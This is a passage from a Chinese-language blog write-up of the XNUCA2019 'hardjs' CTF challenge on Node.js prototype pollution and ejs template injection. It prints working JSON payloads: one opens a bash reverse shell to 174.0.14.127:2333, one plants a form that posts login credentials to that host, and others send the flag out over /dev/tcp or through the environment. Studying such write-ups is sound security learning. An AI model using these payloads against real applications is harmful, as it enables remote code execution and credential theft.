<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;: &quot;fuck&quot;, &quot;content&quot;: &#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;outputFunctionName&quot;: &quot;a; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;174.0.14.127&#x2F;2333 0&lt;&amp;1 2&gt;&amp;1\&quot;&#39;); &#x2F;&#x2F;&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;logger&quot;:&quot;&lt;form action&#x3D;&#39;http:&#x2F;&#x2F;174.0.14.127:2333&#39; method&#x3D;&#39;post&#39; class&#x3D;&#39;am-form&#39;&gt;&lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;username&#39; id&#x3D;&#39;email&#39; value&#x3D;&#39;&#39;&gt;&lt;input type&#x3D;&#39;password&#39; name&#x3D;&#39;password&#39; id&#x3D;&#39;password&#39; value&#x3D;&#39;&#39;&gt;&lt;input type&#x3D;&#39;submit&#39; name&#x3D;&#39;&#39; &gt;&lt;&#x2F;form&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>其他解法: </p>
<h4 id="利用ejs-进行-rce"><a href="#利用ejs-进行-rce" class="headerlink" title="利用ejs 进行 rce"></a>利用ejs 进行 rce</h4><p>解法一: </p>
<p>查看ejs的源码，看到下面代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (!this.source) &#123;</span><br><span class="line">  this.generateSource();</span><br><span class="line">  prepended +&#x3D; &#39;  var __output &#x3D; [], __append &#x3D; __output.push.bind(__output);&#39; + &#39;\n&#39;;</span><br><span class="line">  if (opts.outputFunctionName) &#123;</span><br><span class="line">    prepended +&#x3D; &#39;  var &#39; + opts.outputFunctionName + &#39; &#x3D; __append;&#39; + &#39;\n&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">  if (opts._with !&#x3D;&#x3D; false) &#123;</span><br><span class="line">    prepended +&#x3D;  &#39;  with (&#39; + opts.localsName + &#39; || &#123;&#125;) &#123;&#39; + &#39;\n&#39;;</span><br><span class="line">    appended +&#x3D; &#39;  &#125;&#39; + &#39;\n&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">  appended +&#x3D; &#39;  return __output.join(&quot;&quot;);&#39; + &#39;\n&#39;;</span><br><span class="line">  this.source &#x3D; prepended + this.source + appended;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在看后面是一个动态函数生成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">    ctor &#x3D; Function;</span><br><span class="line">  &#125;</span><br><span class="line">  fn &#x3D; new ctor(opts.localsName + &#39;, escapeFn, include, rethrow&#39;, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以需要伪造 <code>outputFunctionName</code> 为一段恶意代码，就可以实现rce ，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;test&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:</span><br><span class="line">&#123;&quot;outputFunctionName&quot;:&quot;a&#x3D;1;process.mainModule.require(&#39;child_process&#39;).exec(&#39;b</span><br><span class="line">ash -c \&quot;echo $FLAG&gt;&#x2F;dev&#x2F;tcp&#x2F;xxxxx&#x2F;xx\&quot;&#39;)&#x2F;&#x2F;&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>解法二的payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;client&quot;: true,&quot;escapeFunction&quot;: &quot;1; return</span><br><span class="line">process.env.FLAG&quot;,&quot;debug&quot;:true, &quot;compileDebug&quot;: true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>详细参考官方wp</p>
<p>参考WP: </p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6113">https://xz.aliyun.com/t/6113</a></p>
<p><a target="_blank" rel="noopener" href="https://lihuaiqiu.github.io/2019/09/25/XNUCA2019-Hardjs/">https://lihuaiqiu.github.io/2019/09/25/XNUCA2019-Hardjs/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bdwms.com/?p=525">https://www.bdwms.com/?p=525</a></p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ifonlyddw/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">https://gitee.com/ifonlyddw/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a> (官方wp, 不过我clone到了码云,这样更快一点)</p>
<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03    总结"></a>0x03    总结</h1><p><strong>不积跬步无以至千里</strong></p>
<p>后面有时间可以多找点这种题刷一刷,,, 自己审一审,,, 花了一上午和一下午, 值了!!! 总算是对原型链污染有点印象了!</p>
<p>继续努力</p>
<p>关于这个漏洞, 有点和pop 链的构造相似, 可能因为都属于面向对象, 当然关于这一块的漏洞还有很多, 可以看这篇文章</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12659738.html">https://www.cnblogs.com/20175211lyz/p/12659738.html</a></p>
<h1 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04    参考资料"></a>0x04    参考资料</h1><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链</a></p>
<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Smi1e师傅的文章</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">P🐮的文章</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/176884">https://www.anquanke.com/post/id/176884</a></p>
<p><a target="_blank" rel="noopener" href="https://meizjm3i.github.io/2018/09/11/JavaScript_Prototype_Pollution/">https://meizjm3i.github.io/2018/09/11/JavaScript_Prototype_Pollution/</a> 由浅入深, 并讲解了例题</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/755/#hard-thejs">https://paper.seebug.org/755/#hard-thejs</a>  一篇writeup 可以看看思路….Orz</p>
<p><a target="_blank" rel="noopener" href="https://medium.com/better-programming/prototypes-in-javascript-5bba2990e04b">https://medium.com/better-programming/prototypes-in-javascript-5bba2990e04b</a></p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/fe9/basic/zk5e4f">https://www.yuque.com/fe9/basic/zk5e4f</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bdwms.com/?p=525">https://www.bdwms.com/?p=525</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bdwms.com/?p=525">深入理解prototype proto 和 constructor 的关系</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/710f.html">https://hack-for.fun/710f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/">原型链污染攻击</a><a class="post-meta__tags" href="/tags/Node-js/">Node.js</a><a class="post-meta__tags" href="/tags/JavaScript/">JavaScript</a></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/e42fccb.html"><i class="fa fa-chevron-left">  </i><span>常见端口服务漏洞</span></a></div><div class="next-post pull-right"><a href="/e280.html"><span>一文小总结逻辑漏洞</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>